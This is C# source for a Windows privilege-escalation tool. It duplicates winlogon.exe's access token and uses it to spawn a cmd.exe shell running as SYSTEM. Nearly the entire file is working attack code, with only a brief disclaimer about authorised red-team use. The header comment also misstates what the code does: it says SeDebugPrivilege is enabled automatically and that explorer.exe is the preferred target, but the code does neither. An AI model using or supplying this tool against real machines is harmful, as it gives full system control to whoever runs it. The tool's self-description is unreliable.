/*
.SYNOPSIS
    Token Impersonation: Elevate to NT AUTHORITY\SYSTEM by impersonating a SYSTEM process token.

.DESCRIPTION
    This program elevates privileges to SYSTEM by duplicating the access token of a target
    system process (such as explorer.exe or winlogon.exe). It requires administrator privileges
    and enables the SeDebugPrivilege to access tokens of other processes.

    The tool first attempts to locate a user process (preferably explorer.exe), opens its token,
    duplicates it, and then uses CreateProcessWithTokenW to launch a new process (cmd.exe by default)
    in the context of SYSTEM with access to the interactive desktop (WinSta0\Default).

    This is a "safe" implementation: it does not perform direct impersonation (e.g., ImpersonateLoggedOnUser),
    but instead creates a primary token to launch a new process, reducing the risk of token leakage or instability.

.REQUIREMENTS
    - Administrator privileges (run as Administrator)
    - SeDebugPrivilege (automatically enabled)
    - A suitable target process must be running (ideally explorer.exe in the current session)

.NOTES
    Author: murrzik
    License: MIT
    Warning: Use only for legal and authorized purposes (e.g., red-team operations with proper consent).
*/
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

class ImpersonateAndRun
{
    // WinAPI
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(UInt32 processAccess, bool bInheritHandle, int processId);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(
        IntPtr hExistingToken,
        uint dwDesiredAccess,
        IntPtr lpTokenAttributes,
        int ImpersonationLevel,
        int TokenType,
        out IntPtr phNewToken
    );

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessWithTokenW(
        IntPtr hToken,
        int logonFlags,
        string applicationName,
        string commandLine,
        int creationFlags,
        IntPtr environment,
        string currentDirectory,
        ref STARTUPINFO startupInfo,
        out PROCESS_INFORMATION processInformation
    );

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);

    // Structs
    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX, dwY, dwXSize, dwYSize;
        public int dwXCountChars, dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    // Consts
    const uint PROCESS_QUERY_INFORMATION = 0x0400;
    const uint TOKEN_DUPLICATE = 0x0002;
    const uint TOKEN_QUERY = 0x0008;
    const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
    const uint TOKEN_ADJUST_DEFAULT = 0x0080;
    const uint TOKEN_ADJUST_SESSIONID = 0x0100;
    const int SecurityImpersonation = 2;
    const int TokenPrimary = 1;
    const int CREATE_NEW_CONSOLE = 0x00000010;

    static void Main()
    {
        Console.WriteLine("[*] Finding winlogon.exe...");
        Process proc = Process.GetProcessesByName("winlogon")[0];

        IntPtr hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, proc.Id);
        if (hProcess == IntPtr.Zero)
        {
            Console.WriteLine("[-] OpenProcess failed.");
            return;
        }

        IntPtr hToken;
        if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken))
        {
            Console.WriteLine("[-] OpenProcessToken failed.");
            return;
        }

        IntPtr hPrimaryToken;
        bool success = DuplicateTokenEx(
            hToken,
            TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID,
            IntPtr.Zero,
            SecurityImpersonation,
            TokenPrimary,
            out hPrimaryToken
        );

        if (!success)
        {
            Console.WriteLine("[-] DuplicateTokenEx failed.");
            return;
        }

        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);
        PROCESS_INFORMATION pi;

        Console.WriteLine("[+] Launching SYSTEM cmd.exe...");
        bool created = CreateProcessWithTokenW(
            hPrimaryToken,
            0,
            null,
            "cmd.exe",
            CREATE_NEW_CONSOLE,
            IntPtr.Zero,
            null,
            ref si,
            out pi
        );

        if (!created)
        {
            Console.WriteLine("[-] CreateProcessWithTokenW failed.");
        }
        else
        {
            Console.WriteLine("[+] SYSTEM shell started! PID: {0}", pi.dwProcessId);
        }

        // Cleanup
        CloseHandle(hToken);
        CloseHandle(hPrimaryToken);
    }
}
